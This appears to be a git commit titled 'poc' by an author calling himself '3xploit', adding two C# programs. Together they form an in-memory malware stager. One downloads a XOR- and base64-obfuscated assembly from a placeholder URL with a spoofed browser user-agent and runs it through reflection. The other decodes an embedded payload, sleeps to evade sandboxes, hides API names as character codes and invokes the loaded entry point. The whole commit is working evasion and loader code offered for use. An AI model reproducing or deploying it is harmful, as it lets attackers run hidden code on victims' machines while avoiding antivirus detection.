5aae9183e46e89586067ba1bf124e6e9352b5f99
3xploit <pentesting8989@protonmail.com>
2020-08-25 20:29:24 -0400

    poc

---
+++ load entrypoint dll/load entrypoint dll/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace load_entrypoint_dll
+{
+    public  class EJECUCION
+    {
+     //3xploit 25-08-2020
+       public static void Main()
+        {
+            string PAYLOAD = "sring bs64 reverse add replace ";
+            string reverse = ReverseString(PAYLOAD);
+            string Rep = reverse.Replace("#", "A");
+            
+            var FRB64 = new string(new char[] { (char)70, (char)114, (char)111, (char)109, (char)66, (char)97, (char)115, (char)101, (char)54, (char)52, (char)83, (char)116, (char)114, (char)105, (char)110, (char)103 });
+            var SLEEP = new string(new char[] { (char)83, (char)108, (char)101, (char)101, (char)112 });
+            byte[] x3 = (byte[])typeof(System.Convert).GetMethod(FRB64).Invoke(null, new object[] { Rep });
+
+            Type[] TIEMPO = { typeof(int) };
+            typeof(System.Threading.Thread).GetMethod(SLEEP, TIEMPO).Invoke(null, new object[] { 25000 });
+
+            var X1 = System.Reflection.Assembly.Load(x3);
+            var ENT = new string(new char[] { (char)69, (char)110, (char)116, (char)114, (char)121, (char)80, (char)111, (char)105, (char)110, (char)116 });
+            var INV = new string(new char[] { (char)105, (char)110, (char)118, (char)111, (char)107, (char)101 });
+            var X2 = (System.Reflection.MethodInfo)Microsoft.VisualBasic.CompilerServices.LateBinding.LateGet(X1, null, ENT, null, null, null);
+            Microsoft.VisualBasic.CompilerServices.LateBinding.LateCall(X2, null, INV, new object[] { null, null }, null, null);
+
+        }
+        public static string ReverseString(string s)
+        {
+            char[] arr = s.ToCharArray();
+            Array.Reverse(arr);
+            return new string(arr);
+
+        }
+    }
+    }
---
+++ reflection/reflection/Program.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace reflection
+{
+    static class Program
+    {
+        /// <summary>
+        /// Punto de entrada principal para la aplicación.
+        /// </summary>
+
+        static void Main()
+        {
+            //3xploit 25-08-2020
+            var wc = new WebClient();
+            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
+            
+            var x1 = Assembly.Load(System.Convert.FromBase64String(XOR_KEY(wc.DownloadString("link"), "pass")));
+            
+            var x2 = x1.GetType("load_entrypoint_dll.EJECUCION");
+            var x3 = Activator.CreateInstance(x2);
+            var x4  = x2.GetMethod("Main");
+
+            x4.Invoke(x3, null);
+
+        }
+        private static string XOR_KEY(string text, string key)
+        {
+            var decrypted = new StringBuilder();
+
+            for (int i = 0; i < (text.Length - 1); i++)
+            {
+                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
+            }
+
+            return decrypted.ToString();
+        }
+    }
+}
